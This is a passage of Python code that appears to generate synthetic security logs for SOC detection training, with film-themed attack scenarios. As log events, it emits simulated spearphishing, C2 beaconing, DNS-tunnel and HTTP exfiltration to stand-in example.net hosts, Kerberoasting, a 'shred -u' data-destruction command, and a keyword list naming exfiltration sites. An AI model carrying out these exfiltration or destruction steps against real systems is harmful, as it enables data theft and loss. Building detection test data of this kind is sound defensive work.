    if error_code:
        event["errorCode"] = error_code
        event["errorMessage"] = error_message
    return event

def _cloudtrail_line(event: dict, sev: int = 6) -> str:
    return rfc5424(sev, 13, "cloudtrail-delivery.cia.gov", "cloudtrail", "-", "CLOUDTRAIL",
                   json.dumps(event, separators=(",", ":")))

def gen_cloudtrail_event() -> str:
    """Ambient AWS CloudTrail traffic -- entirely within security guardrails.

    Every event here is MFA-authenticated AssumedRole traffic from a trusted
    corporate egress IP. The occasional AccessDenied is the org's
    least-privilege boundary working as intended, not a gap.
    """
    program = random.choice(list(AWS_ACCOUNTS))
    op = random.choice(OPERATIVES)
    bucket = AWS_S3_BUCKETS[program]
    account = AWS_ACCOUNTS[program]

    choice = random.choices(
        ["console_login", "get_object", "put_object", "describe_instances", "access_denied"],
        weights=[3, 4, 2, 3, 2],
    )[0]

    if choice == "console_login":
        event = _cloudtrail_event(op, program, "ConsoleLogin", "signin.amazonaws.com",
                                   response_elements={"ConsoleLogin": "Success"})
    elif choice == "get_object":
        event = _cloudtrail_event(op, program, "GetObject", "s3.amazonaws.com",
                                   request_params={"bucketName": bucket, "key": f"reports/{op['name']}.json.enc"})
    elif choice == "put_object":
        event = _cloudtrail_event(op, program, "PutObject", "s3.amazonaws.com", read_only=False,
                                   request_params={"bucketName": bucket, "key": f"uploads/{op['name']}-{random.randint(1000,9999)}.enc",
                                                    "x-amz-server-side-encryption": "aws:kms"})
    elif choice == "describe_instances":
        event = _cloudtrail_event(op, program, "DescribeInstances", "ec2.amazonaws.com",
                                   request_params={"filterSet": {}})
    else:  # access_denied -- a correctly scoped-out role hitting a boundary. Not another program's data.
        other_program = random.choice([p for p in AWS_ACCOUNTS if p != program])
        event = _cloudtrail_event(op, program, "GetObject", "s3.amazonaws.com",
                                   request_params={"bucketName": AWS_S3_BUCKETS[other_program], "key": "restricted"},
                                   error_code="AccessDenied",
                                   error_message=f"User: arn:aws:sts::{account}:assumed-role/{AWS_ROLES[program]}/{op['name']} is not authorized to perform this action")
    return _cloudtrail_line(event, sev=4 if choice == "access_denied" else 6)

def _proc(name: str, cmdline: str, *, display_name: str | None = None, publisher: str | None = None,
          user: str | None = None, image_path: str | None = None,
          parent: dict | None = None) -> dict:
    """Build a src.process/tgt.process-shaped dict (real field names -- see EDR schema note)."""
    p: dict = {"name": name, "cmdline": cmdline}
    if display_name: p["displayName"] = display_name
    if publisher: p["publisher"] = publisher
    if user: p["user"] = user
    if image_path: p["image"] = {"path": image_path, "originalFileName": name}
    if parent: p["parent"] = parent
    return p

def _edr_event(event_type: str, endpoint: str, *, category: str = "Process", site: str = "TREADSTONE",
                src_process: dict | None = None, tgt_process: dict | None = None,
                tgt_file: dict | None = None, src_ip: str | None = None, src_port: int | None = None,
                dst_ip: str | None = None, dst_port: int | None = None, net_direction: str | None = None,
                registry: dict | None = None, task_path: str | None = None, module_path: str | None = None,
                cmd_script: str | None = None, dns_request: str | None = None,
                indicator: dict | None = None) -> dict:
    """Build a realistic SentinelOne EDR event. Field names grounded in this
    tenant's own deployed rules (data/extracted.json) -- see the EDR schema
    note above EDR_ENDPOINTS."""
    os_name = EDR_ENDPOINTS.get(endpoint, "windows")
    now = datetime.now(timezone.utc)
    event: dict = {
        "dataSource": {"name": "SentinelOne", "vendor": "SentinelOne", "category": "security"},
        "event": {"type": event_type, "category": category,
                  "time": now.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"},
        "endpoint": {"os": os_name, "name": endpoint,
                     "type": "server" if endpoint.upper() in ("LANGLEY-DC01", "BLACKBRIAR-DB01") else "workstation"},
        # NOTE: named "s1Agent", not "agent" -- "agent" is a reserved envelope
        # key (syslog-ng's forwarder tag) and would otherwise collide.
        "s1Agent": {"uuid": "-".join("".join(random.choices("0123456789abcdef", k=n)) for n in (8, 4, 4, 4, 12)),
                    "version": EDR_AGENT_VERSION},
        "site": {"name": site},
        "account": {"name": "CIA-Langley"},
    }
    src: dict = {}
    if src_process: src["process"] = src_process
    if src_ip: src["ip"] = {"address": src_ip}
    if src_port: src["port"] = {"number": src_port}
    if src: event["src"] = src

    tgt: dict = {}
    if tgt_process: tgt["process"] = tgt_process
    if tgt_file: tgt["file"] = tgt_file
    if tgt: event["tgt"] = tgt

    dst: dict = {}
    if dst_ip: dst["ip"] = {"address": dst_ip}
    if dst_port: dst["port"] = {"number": dst_port}
    if dst: event["dst"] = dst
    if net_direction: event["event"]["network"] = {"direction": net_direction}
    if registry: event["registry"] = registry
    if task_path: event["task"] = {"path": task_path}
    if module_path: event["module"] = {"path": module_path}
    if cmd_script: event["cmdScript"] = {"content": cmd_script}
    if dns_request: event["event"]["dns"] = {"request": dns_request}
    if indicator: event["indicator"] = indicator
    return event

def _flatten(d: dict, prefix: str = "") -> dict:
    """Flatten a nested dict to SDL's dotted-key attrs shape (matches how
    FoundStone's own ingester.py / real detection rule pair_lists address
    fields, e.g. "tgt.process.cmdline")."""
    out: dict = {}
    for k, v in d.items():
        key = f"{prefix}.{k}" if prefix else k
        if isinstance(v, dict):
            out.update(_flatten(v, key))
        else:
            out[key] = v
    return out

def _edr_line(event: dict, sev: int = 6) -> None:
    """Ingest an EDR event directly into SDL via addEvents -- bypassing
    syslog-ng/DataPipeline entirely (see the SDL_BASE_URL/SDL_WRITE_TOKEN
    comment near the top of this file). Returns None: there is nothing left
    for the caller to send over the syslog-ng TCP socket."""
    if not SDL_BASE_URL or not SDL_WRITE_TOKEN:
        log.warning("SDL_BASE_URL/SDL_WRITE_TOKEN not set -- skipping direct EDR ingest for %s",
                    event.get("event", {}).get("type"))
        return None

    attrs = _flatten(event)
    attrs["tags"] = "treadstone-simulation"
    now_ms = int(time.time() * 1000)
    now_ns = now_ms * 1_000_000  # addEvents requires nanoseconds since epoch -- a
                                  # millisecond `ts` is silently dropped (bytesCharged=0)
    payload = json.dumps({
        "token": SDL_WRITE_TOKEN,
        "session": f"treadstone-edr-{now_ms}-{random.randint(0, 999999)}",
        "events": [{"ts": str(now_ns), "attrs": attrs}],
    }).encode("utf-8")
    req = urllib.request.Request(
        f"{SDL_BASE_URL}/api/addEvents", data=payload,
        headers={"Content-Type": "application/json"}, method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            resp.read()
    except urllib.error.URLError as exc:
        log.error("Direct SDL ingest failed for EDR event (%s): %s",
                  event.get("event", {}).get("type"), exc)
    return None

def gen_s1_edr_event() -> None:
    """Ambient SentinelOne EDR traffic -- signed publishers, ordinary parent/child
    process trees. LOLBins, credential dumping, and persistence never appear
    here; only in the dedicated EDR attack scenarios."""
    endpoint = random.choice(list(EDR_ENDPOINTS))
    op = random.choice(OPERATIVES)
    parent_name, parent_cmd, child_name, child_cmd, publisher = random.choice(EDR_BENIGN_PROCS)

    choice = random.choices(
        ["process", "dns", "ip_connect", "file"], weights=[6, 3, 3, 2],
    )[0]

    if choice == "process":
        parent = _proc(parent_name, parent_cmd, publisher=publisher)
        tgt = _proc(child_name, child_cmd, publisher=publisher, user=op["name"], parent=parent)
        event = _edr_event("Process Creation", endpoint, tgt_process=tgt)
    elif choice == "dns":
        src = _proc(parent_name, parent_cmd, publisher=publisher, user=op["name"])
        event = _edr_event("DNS Resolved", endpoint, category="Network", src_process=src,
                            dns_request=random.choice(["login.microsoftonline.com", "www.bbc.co.uk",
                                                        "update.googleapis.com", "outlook.office365.com"]))
    elif choice == "ip_connect":
        src = _proc(parent_name, parent_cmd, publisher=publisher, user=op["name"])
        event = _edr_event("IP Connect", endpoint, category="Network", src_process=src,
                            src_ip=random.choice(INTERNAL_IPS), src_port=random.randint(49152, 65535),
                            dst_ip=random.choice(["20.190.160.14", "142.250.80.110", "151.101.0.81"]),
                            dst_port=443, net_direction="OUTGOING")
    else:  # file
        proc = _proc(parent_name, parent_cmd, publisher=publisher, user=op["name"])
        event = _edr_event("File Creation", endpoint, category="File", src_process=proc,
                            tgt_file={"path": f"C:\\Users\\{op['name']}\\Documents\\report.docx"
                                      if EDR_ENDPOINTS[endpoint] == "windows"
                                      else f"/home/{op['name']}/report.pdf",
                                      "name": "report", "extension": "docx" if EDR_ENDPOINTS[endpoint] == "windows" else "pdf"})
    return _edr_line(event)

def _fake_sha256() -> str:
    chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    return "".join(random.choices(chars, k=43))

# ─── Scenario engine ────────────────────────────────────────────────────────────
#
# Scripted, correlated multi-source storylines straight out of the films. When a
# scenario fires, it emits a short burst of events across several sources that
# share actors/hosts/IPs — so a SOC analyst can pivot host→user→IP and watch an
# actual Bourne plot unfold across firewall, identity, proxy and host logs.

def _ssh_line(host: str, body: str, sev: int = 6) -> str:
    return rfc5424(sev, 4, host, "sshd", str(random.randint(10000, 65535)), "SSHD", body)

def _sudo_line(host: str, user: str, cmd: str) -> str:
    body = f"{user} : TTY=pts/{random.randint(0,5)} ; PWD=/root ; USER=root ; COMMAND={cmd}"
    return rfc5424(5, 10, host, "sudo", str(random.randint(10000, 65535)), "SUDO", body)

def _http_line(host: str, src: str, user: str, method: str, path: str,
               status: int, size: int, ua: str = None) -> str:
    ua = ua or random.choice(USER_AGENTS)
    ts = datetime.now(timezone.utc).strftime("%d/%b/%Y:%H:%M:%S +0000")
    clf = f'{src} - {user} [{ts}] "{method} {path} HTTP/1.1" {status} {size} "-" "{ua}"'
    return rfc5424(6, 16, host, "apache2", str(random.randint(1000, 9999)), "HTTP", clf)

_PROXY_THREAT_KEYWORDS = ("exfil", "deaddrop", "beacon", "sigint-cache",
                          "mainframe-gw", "neski", "pecos-oil", "deepdream",
                          "securedrop", "pastebin", "filebin")

def _proxy_line(host: str, client: str, code: str, status: int, bytes_: int,
                method: str, target: str, user: str, peer: str, ctype: str,
                sev: int = 6) -> str:
    """Zscaler Internet Access-shaped event (msgid PROXY). Field names
    grounded in this tenant's own deployed Zscaler-sourced rules (app_name,
    action, malware.name, http_request.url.hostname/categories,
    unmapped.event.threatcat, risk_details). Keeps the original Squid-style
    call signature so existing scenario call sites don't need to change --
    only the wire format is now Zscaler-shaped JSON instead of Squid text."""
    hostname = target.split("://")[-1].split("/")[0].split(":")[0]
    is_threat = any(k in target.lower() for k in _PROXY_THREAT_KEYWORDS)
    blocked = code == "TCP_DENIED"
    # Action reflects only whether THIS call was denied -- not whether the
    # destination is a threat. Scenarios that model a successful exfil pass a
    # non-denied code (e.g. TCP_TUNNEL) to a threat-keyword domain on purpose;
    # forcing that to "IPS Reset" would silently turn the exfil into a block.
    action = "Blocked" if blocked else "Allowed"
    event: dict = {
        "app_name": "Suspicious Web Activity" if is_threat else "Web Browsing",
        "action": action,
        "user": {"name": user},
        "client_ip": client,
        "http_request": {
            "method": method,
            "url": {"hostname": hostname,
                     "categories": ["Suspicious Destinations"] if is_threat else ["General Browsing"]},
        },
        "risk_details": "malicious" if is_threat else "benign",
        "bytes": bytes_,
        "time": datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ"),
    }
    if is_threat:
        event["malware"] = {"name": "unknown.threat"}
        event["unmapped"] = {"event": {"threatcat": "c2"}}
    return rfc5424(sev, 16, host, "zscaler", str(random.randint(1000, 9999)), "PROXY",
                   json.dumps(event, separators=(",", ":")))

def _audit_line(host: str, src: str, dst: str, dpt: int) -> str:
    mac = ":".join(f"{random.randint(0,255):02x}" for _ in range(6))
    body = (f"kernel: [UFW BLOCK] IN=eth0 OUT= MAC={mac} SRC={src} DST={dst} "
            f"LEN={random.randint(40,1500)} TOS=0x00 PREC=0x00 TTL={random.randint(40,128)} "
            f"ID={random.randint(1000,60000)} DF PROTO=TCP SPT={random.randint(49152,65535)} "
            f"DPT={dpt} WINDOW={random.randint(1024,65535)} RES=0x00 SYN URGP=0")
    return rfc5424(4, 0, host, "kernel", "-", "AUDIT", body)

def _duo_line(proxy: str, alias: str, clearance: str, app: str, ip: str,
              result: str, reason: str, factor: str = "duo_push") -> str:
    """Cisco Duo authentication event. Field names grounded in this tenant's
    real deployed Duo rules (status/status_detail/unmapped.event_type/
    unmapped.factor); see gen_duo_auth for the same shape's ambient version."""
    geo = IP_GEO.get(ip, {"city": "Unknown", "state": "Unknown", "country": "Unknown"})
    now = datetime.now(timezone.utc)
    txid = "-".join("".join(random.choices("0123456789abcdef", k=n)) for n in (8, 4, 4, 4, 12))
    event = {
        "access_device": {
            "ip": ip,
            "location": {"city": geo["city"], "state": geo["state"], "country": geo["country"]},
            "browser": random.choice(["Chrome", "Firefox", "Edge", "Safari"]),
            "browser_version": f"{random.randint(110,124)}.0",
            "os": random.choice(["Windows", "Mac OS X", "Linux", "iOS", "Android"]),
            "os_version": f"{random.randint(10,15)}.{random.randint(0,6)}",
        },
        "application": {"name": app, "key": "DI" + "".join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=18))},
        "auth_device": {
            "ip": ip,
            "location": {"city": geo["city"], "state": geo["state"], "country": geo["country"]},
            "name": f"+1 555-{random.randint(100,999)}-{random.randint(1000,9999)}",
        },
        "status": result,
        "status_detail": reason,
        "unmapped": {"event_type": "authentication", "factor": factor},
        "auth_timestamp": int(now.timestamp()),   # renamed from `timestamp` to avoid envelope collision
        "isotimestamp": now.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "+00:00",
        "txid": txid,
        "user": {"name": alias, "key": "DU" + "".join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=18)), "groups": [clearance]},
        "email": f"{alias}@cia.gov",
    }
    sev = {"fraud": 1, "denied": 4, "success": 6}[result]
    return rfc5424(sev, 13, proxy, "duo", "-", "DUO", json.dumps(event, separators=(",", ":")))

def _dns_line(host: str, client: str, domain: str, qtype: str = "A", sev: int = 6) -> str:
    cid = hex(random.randint(0x100000, 0xFFFFFF))
    msg = (f"client @{cid} {client}#{random.randint(1024,65535)} ({domain}): "
           f"query: {domain} IN {qtype} +E(0) ({random.choice(DNS_RESOLVERS)})")
    return rfc5424(sev, 3, host, "named", str(random.randint(100,9999)), "DNS", msg)

def _db_line(user: str, obj: str, cmd: str, cls: str, stmt: str, rows: int) -> str:
    sid = random.randint(1, 99999)
    msg = (f"{user}@{DB_NAME} LOG:  AUDIT: SESSION,{sid},1,{cls},{cmd},TABLE,{obj},"
           f'"{stmt}",<not logged> rows={rows}')
    sev = 4 if rows >= 1000 or cls == "WRITE" else 6
    return rfc5424(sev, 16, "blackbriar-db01.cia.gov", "postgres", str(random.randint(1000,9999)),
                   "DBAUDIT", msg)

def _win_line(comp: str, fields: dict, sev: int = 6) -> str:
    """Scenario call sites still pass the old flat PascalCase fields dict
    (EventID/Event/TargetUserName/...) for readability; this maps them into
    the real nested winEventLog.* shape (see _win_event_json) so no scenario
    call site needs to change."""
    fields = dict(fields)
    eid = fields.pop("EventID")
    description = fields.pop("Event", "")
    fields.pop("LogonTypeName", None)  # descriptive-only, not a real eventData field
    event_data = {_WIN_FIELD_MAP[k]: v for k, v in fields.items() if k in _WIN_FIELD_MAP}
    event = _win_event_json(comp, eid, description, event_data)
    return rfc5424(sev, 13, f"{comp.lower()}.cia.gov", "Security", "-", "WINEVENT",
                   json.dumps(event, separators=(",", ":")))


def sc_zurich_bank():
    """IDENTITY — Bourne surfaces in Zurich and opens Gemeinschaft box 0094."""
    ip, host = "82.145.67.201", "embassy-zurich-fw01.cia.gov"
    return ("Zurich — Gemeinschaft Bank box 0094 (Bourne resurfaces)", [
        _panw_vpn_line(host, "john.michael.kane", ip),
        _duo_line("duo-authproxy01.cia.gov", "john.michael.kane", "TREADSTONE", "Gemeinschaft Bank Portal", ip, "success", "user_approved"),
        _http_line("blackbriar-db01.cia.gov", ip, "john.michael.kane", "GET", "/intel/db/passport?name=john+michael+kane", 200, 4096),
        _sudo_line("blackbriar-db01.cia.gov", "noah.vosen", "/usr/bin/grep -r 'John Michael Kane' /intel/db/passports/"),
        _panw_ids_line("noc-ids01.cia.gov", PANW_NARRATIVE_SIGNATURES["beacon"], ip, "10.0.1.10"),
        _duo_line("duo-authproxy02.cia.gov", "john.michael.kane", "TREADSTONE", "Gemeinschaft Bank Portal", ip, "fraud", "user_marked_fraud"),
        _proxy_line("embassy-zurich-fw01.cia.gov", "10.1.0.50", "TCP_TUNNEL", 200, 81233, "CONNECT", "gemeinschaft-bank.example.net:443", "john.michael.kane", "HIER_DIRECT/"+ip, "-"),
    ])

def sc_paris_safehouse():
    """IDENTITY — Conklin orders the hit on Bourne from the Paris safehouse."""
    ip, host = "89.149.225.88", "embassy-paris-fw01.cia.gov"
    return ("Paris — Conklin authorizes the Treadstone kill order", [
        _ssh_line(host, "Accepted publickey for alex.conklin from "+ip+" port 51022 ssh2: RSA SHA256:"+_fake_sha256()),
        _sudo_line(host, "alex.conklin", "/opt/blackbriar/bin/authorize_kill.py --target jason.bourne --asset ASSET-PROFESSOR"),
        _duo_line("duo-authproxy02.cia.gov", "m.kiluanyi", "TREADSTONE", "Treadstone Ops Portal", ip, "success", "user_approved"),
        _panw_ids_line("noc-ids01.cia.gov", PANW_NARRATIVE_SIGNATURES["c2"], ip, "10.0.2.20"),
        _http_line("blackbriar-db01.cia.gov", ip, "alex.conklin", "POST", "/ops/rendition/request", 201, 812),
    ])

def sc_berlin_neski():
    """SUPREMACY — Landy pulls the Neski files; Abbott scrubs them; Kirill probes."""
    bln, msk = "195.62.13.45", "91.200.12.178"
    return ("Berlin — the Neski files & Abbott's cover-up", [
        _http_line("blackbriar-db01.cia.gov", "10.2.0.1", "pamela.landy", "GET", "/intel/archive/neski-files-2003", 200, 220143),
        _proxy_line("embassy-berlin-fw01.cia.gov", "10.2.0.1", "TCP_MISS", 200, 5021544, "GET", "https://archive.example.org/neski-files-2003.tar.gz", "pamela.landy", "HIER_DIRECT/"+bln, "application/gzip"),
        _panw_ids_line("noc-ids01.cia.gov", PANW_NARRATIVE_SIGNATURES["neski"], bln, "10.2.5.100"),
        _sudo_line("blackbriar-db01.cia.gov", "ward.abbott", "/usr/bin/shred -u /intel/archive/neski-files-2003.tar.gz"),
        _duo_line("duo-authproxy01.cia.gov", "g.volkov", "HOSTILE", "BlackBriar VPN", msk, "fraud", "user_marked_fraud"),
        _ssh_line("blackbriar-db01.cia.gov", "Failed password for danny.zorn from "+bln+" port 44122 ssh2", sev=4),
    ])

def sc_goa_kirill():
    """SUPREMACY — Kirill tracks Bourne to Goa; Marie is killed."""
    ip, host = "188.40.75.132", "safehouse-goa-01.cia.gov"
    return ("Goa — Kirill closes in (Marie)", [
        _duo_line("duo-authproxy02.cia.gov", "g.volkov", "HOSTILE", "Asset Tracker (CLASSIFIED)", ip, "fraud", "user_marked_fraud"),
        _panw_ids_line("noc-ids01.cia.gov", PANW_NARRATIVE_SIGNATURES["beacon"], ip, "10.0.1.11"),
        _ssh_line(host, "Accepted publickey for marie.kreutz from "+ip+" port 49888 ssh2: RSA SHA256:"+_fake_sha256()),
        _audit_line(host, ip, "10.2.5.100", 22),
        _proxy_line(host, "10.2.5.100", "TCP_TUNNEL", 200, 14233, "CONNECT", "www.bbc.co.uk:443", "marie.kreutz", "HIER_DIRECT/151.101.0.81", "-"),
    ])

def sc_waterloo_ross():
    """ULTIMATUM — Vosen burns Guardian journalist Simon Ross at Waterloo."""
    ip = "178.62.55.214"
    return ("Waterloo — Simon Ross / The Guardian source burned", [
        _http_line("blackbriar-db01.cia.gov", ip, "simon.ross", "GET", "/api/v2/ops/blackbriar/status", 403, 512),
        _proxy_line("safe-london-proxy01.cia.gov", "10.2.5.100", "TCP_TUNNEL", 200, 2204411, "CONNECT", "securedrop.theguardian.example.net:443", "simon.ross", "HIER_DIRECT/"+ip, "-"),
        _duo_line("duo-authproxy01.cia.gov", "n.vosen", "BLACKBRIAR", "Iron Hand Targeting System", "203.0.113.77", "success", "user_approved"),
        _sudo_line("blackbriar-db01.cia.gov", "noah.vosen", "/opt/blackbriar/bin/authorize_kill.py --target simon.ross --asset ASSET-PAZ"),
        _panw_ids_line("noc-ids01.cia.gov", PANW_NARRATIVE_SIGNATURES["c2"], ip, "10.0.2.21"),
    ])

def sc_madrid_daniels():
    """ULTIMATUM — Bourne reaches Daniels' Madrid station; Blackbriar exposed."""
    ip, host = "217.31.48.130", "embassy-madrid-fw01.cia.gov"
    return ("Madrid — Neal Daniels station & the Blackbriar files", [
        _duo_line("duo-authproxy02.cia.gov", "r.oakes", "BLACKBRIAR", "BlackBriar VPN", ip, "success", "user_approved"),
        _ssh_line(host, "Accepted publickey for neal.daniels from "+ip+" port 50211 ssh2: RSA SHA256:"+_fake_sha256()),
        _http_line("blackbriar-db01.cia.gov", ip, "neal.daniels", "GET", "/api/v2/ops/blackbriar/status", 200, 18221),
        _sudo_line(host, "neal.daniels", "/opt/blackbriar/bin/burn_program.sh --op TREADSTONE --reason COMPROMISED"),
        _panw_ids_line("noc-ids01.cia.gov", PANW_NARRATIVE_SIGNATURES["beacon"], ip, "10.3.0.1"),
    ])

def sc_tangier_desh():
    """ULTIMATUM — Desh hunts Nicky through Tangier; Bourne intervenes."""
    ip, host = "46.161.41.100", "safehouse-tangier-01.cia.gov"
    return ("Tangier — Desh hunts Nicky Parsons", [
        _duo_line("duo-authproxy01.cia.gov", "sophie.reilly", "BLACKBRIAR", "Treadstone Ops Portal", ip, "success", "user_approved"),
        _duo_line("duo-authproxy01.cia.gov", "p.hassan", "BLACKBRIAR", "Asset Tracker (CLASSIFIED)", ip, "denied", "locked_out"),
        _panw_ids_line("noc-ids01.cia.gov", PANW_NARRATIVE_SIGNATURES["c2"], ip, "10.0.1.10"),
        _ssh_line(host, "Accepted publickey for nicky.parsons from "+ip+" port 51990 ssh2: RSA SHA256:"+_fake_sha256()),
        _audit_line(host, ip, "10.2.5.100", 443),
    ])

def sc_manila_outcome():
    """LEGACY — Aaron Cross goes viral off-cycle; Outcome chem program."""
    ip, host = "103.21.244.0", "safehouse-manila-01.cia.gov"
    return ("Manila — Aaron Cross / Outcome viral off-cycle", [
        _duo_line("duo-authproxy02.cia.gov", "kenneth.kitsom", "OUTCOME", "LARX Field Comms", ip, "success", "valid_passcode", factor="passcode"),
        _http_line("outcome-proxy01.cia.gov", ip, "marta.shearing", "GET", "/ops/outcome/chem-protocol/green", 200, 9123),
        _sudo_line("larx-ctrl01.cia.gov", "eric.byer", "/opt/outcome/bin/viral_off.sh --subject 5 --chem green"),
        _ssh_line(host, "Accepted publickey for marta.shearing from "+ip+" port 49233 ssh2: RSA SHA256:"+_fake_sha256()),
        _panw_traffic_line("ops-dmz-gw01.cia.gov", ip, "10.2.5.100", 443, "ssl"),
    ])

def sc_reykjavik_hack():
    """JASON BOURNE — the CIA black-ops mainframe breach out of Reykjavik."""
    ip, host = "84.17.52.190", "safehouse-reykjavik-01.cia.gov"
    return ("Reykjavik — CIA mainframe breach (Iron Hand exposed)", [
        _ssh_line("ironhand-ctrl01.cia.gov", "Failed password for heather.lee from "+ip+" port 53122 ssh2", sev=4),
        _ssh_line("ironhand-ctrl01.cia.gov", "Accepted publickey for heather.lee from "+ip+" port 53124 ssh2: RSA SHA256:"+_fake_sha256()),
        _panw_ids_line("noc-ids01.cia.gov", PANW_NARRATIVE_SIGNATURES["reykjavik"], ip, "10.0.1.10"),
        _http_line("ironhand-ctrl01.cia.gov", ip, "heather.lee", "GET", "/api/v2/ops/ironhand/targets", 200, 44211),
        _proxy_line(host, "10.0.1.10", "TCP_MISS", 200, 8412233, "POST", "https://mainframe-gw.cia.example.net/ironhand/dump", "heather.lee", "HIER_DIRECT/"+ip, "application/octet-stream"),
        _duo_line("duo-authproxy01.cia.gov", "h.lee", "IRON-HAND", "Iron Hand Targeting System", ip, "denied", "anomalous_push"),
        _sudo_line("ironhand-ctrl01.cia.gov", "heather.lee", "/usr/bin/last -ai | grep "+ip),
    ])

def sc_vegas_dewey():
    """JASON BOURNE — Dewey, Deep Dream & the Exocon showdown in Las Vegas."""
    ip, host = "64.124.201.9", "station-vegas-01.cia.gov"
    return ("Las Vegas — Dewey / Deep Dream backdoor (Exocon)", [
        _duo_line("duo-authproxy02.cia.gov", "a.kalloor", "DEEPDREAM", "Deep Dream Admin Portal", ip, "success", "user_approved"),
        _http_line("ironhand-ctrl01.cia.gov", ip, "robert.dewey", "GET", "/deepdream/admin/users/export", 200, 1882211, ua="DeepDreamBackdoor/0.9 (do-not-log)"),
        _proxy_line(host, "10.5.0.1", "TCP_MISS", 200, 3211044, "POST", "https://api.deepdream.example.com/v1/users/export", "robert.dewey", "HIER_DIRECT/"+ip, "application/json"),
        _panw_ids_line("noc-ids01.cia.gov", PANW_NARRATIVE_SIGNATURES["deepdream"], ip, "10.5.0.1"),
        _sudo_line("ironhand-ctrl01.cia.gov", "robert.dewey", "/opt/ironhand/bin/scrub_dewey_comms.sh --before 2016-07-01"),
    ])

def sc_athens_riots():
    """JASON BOURNE — the Syntagma Square riots; Nicky Parsons is killed."""
    ip, host = "62.169.34.77", "embassy-athens-fw01.cia.gov"
    return ("Athens — Syntagma riots (Nicky Parsons)", [
        _duo_line("duo-authproxy01.cia.gov", "sophie.reilly", "BLACKBRIAR", "Treadstone Ops Portal", ip, "success", "user_approved"),
        _panw_ids_line("noc-ids01.cia.gov", PANW_NARRATIVE_SIGNATURES["beacon"], ip, "10.4.0.1"),
        _duo_line("duo-authproxy01.cia.gov", "c.dassault", "IRON-HAND", "Iron Hand Targeting System", ip, "success", "user_approved"),
        _proxy_line(host, "10.4.0.1", "TCP_TUNNEL", 200, 92344, "CONNECT", "deaddrop-athens.example.net:443", "sophie.reilly", "HIER_DIRECT/"+ip, "-"),
        _audit_line(host, ip, "10.4.0.1", 443),
    ])

def sc_phish_landy():
    """INITIAL ACCESS — spearphish lands, creds harvested, attacker logs in."""
    phish_domain = "cia-portal.example.net"
    ip = "185.220.101.45"
    return ("Spearphish — Langley credential theft (initial access)", [
        _email_line(_mimecast_event(recipient="pamela.landy@cia.gov", sender_name="Langley Security",
                    sender="security-alert@"+phish_domain, subject="ACTION REQUIRED: verify your Langley credentials",
                    malicious=True, category="phish", blocked=False, url="http://"+phish_domain+"/login")),
        _dns_line("langley-dc01.cia.gov", "10.0.1.10", phish_domain, "A", sev=4),
        _proxy_line("web-proxy01.cia.gov", "10.0.1.10", "TCP_MISS", 200, 14233, "GET",
                    "http://"+phish_domain+"/login", "pamela.landy", "HIER_DIRECT/"+ip, "text/html"),
        _duo_line("duo-authproxy01.cia.gov", "pamela.landy", "BLACKBRIAR", "Langley AnyConnect", ip,
                  "denied", "anomalous_push"),
        _win_line("LANGLEY-DC01", {"EventID": 4625, "Event": "An account failed to log on",
                  "LogonType": 3, "TargetUserName": "pamela.landy", "TargetDomainName": "CIA",
                  "Status": "0xC000006D", "SubStatus": "0xC000006A", "IpAddress": ip}, sev=4),
    ])

def sc_dns_beacon():
    """C2 — a Treadstone asset beacons home on a fixed cadence."""
    host, client, dom = "ops-dmz-gw01.cia.gov", "10.2.5.100", "c2.blackbriar.example.net"
    lines = [_dns_line(host, client, dom, "A", sev=4) for _ in range(3)]
    lines.append(_panw_ids_line("noc-ids01.cia.gov", PANW_NARRATIVE_SIGNATURES["beacon"], client, "185.220.101.45"))
    lines.append(_panw_traffic_line("ops-dmz-gw01.cia.gov", client, "185.220.101.45", 443, "ssl"))
    return ("DNS beaconing — Blackbriar asset phones home (C2)", lines)

def sc_dns_tunnel_exfil():
    """EXFIL — proxy blocks the upload, so the Neski files leave via DNS tunneling."""
    host, client = "blackbriar-db01.cia.gov", "10.2.0.1"
    lines = [
        _win_line("BLACKBRIAR-DB01", {"EventID": 4624, "Event": "An account was successfully logged on",
                  "LogonType": 10, "LogonTypeName": "RemoteInteractive", "TargetUserName": "ward.abbott",
                  "TargetDomainName": "CIA", "IpAddress": "195.62.13.45"}),
        _db_line("ward.abbott", "public.neski_files", "SELECT", "READ",
                 "SELECT * FROM neski_files WHERE case_year=2003", 1847),
        _proxy_line("embassy-berlin-fw01.cia.gov", client, "TCP_DENIED", 403, 412, "CONNECT",
                    "exfil-relay.example.com:443", "ward.abbott", "HIER_NONE/-", "-", sev=4),
    ]
    # blocked upload → fall back to DNS tunneling: many long TXT lookups
    lines += [_dns_line("langley-dc01.cia.gov", client, f"{_b32(20)}.{_b32(12)}.exfil.example.net", "TXT", sev=4)
              for _ in range(3)]
    lines.append(_panw_ids_line("noc-ids01.cia.gov", PANW_NARRATIVE_SIGNATURES["neski"], client, "10.0.0.53"))
    return ("DNS tunneling — Neski files exfiltrated past the proxy", lines)

def sc_kerberoast():
    """LATERAL — Kerberoasting the SQL service account on blackbriar-db01."""
    comp = "BLACKBRIAR-DB01"
    return ("Kerberoasting — blackbriar-db01 service account", [
        _win_line("LANGLEY-DC01", {"EventID": 4768, "Event": "A Kerberos authentication ticket (TGT) was requested",
                  "TargetUserName": "noah.vosen", "TargetDomainName": "CIA.LOCAL", "IpAddress": "10.1.0.50"}),
        _win_line("LANGLEY-DC01", {"EventID": 4769, "Event": "A Kerberos service ticket was requested",
                  "TargetUserName": "noah.vosen@CIA.LOCAL", "ServiceName": "MSSQLSvc/blackbriar-db01",
                  "TicketEncryptionType": "0x17", "IpAddress": "10.1.0.50"}, sev=4),
        _win_line(comp, {"EventID": 4624, "Event": "An account was successfully logged on", "LogonType": 3,
                  "LogonTypeName": "Network", "TargetUserName": "svc_mssql", "TargetDomainName": "CIA",
                  "IpAddress": "10.1.0.50"}),
        _db_line("svc_mssql", "public.asset_roster", "SELECT", "READ",
                 "SELECT * FROM asset_roster WHERE clearance='TREADSTONE'", 1847),
    ])

def sc_db_mass_extract():
    """COLLECTION — Vosen pulls the entire asset roster and exfils it."""
    ip = "203.0.113.77"
    return ("Mass DB extraction — the full Treadstone asset roster", [
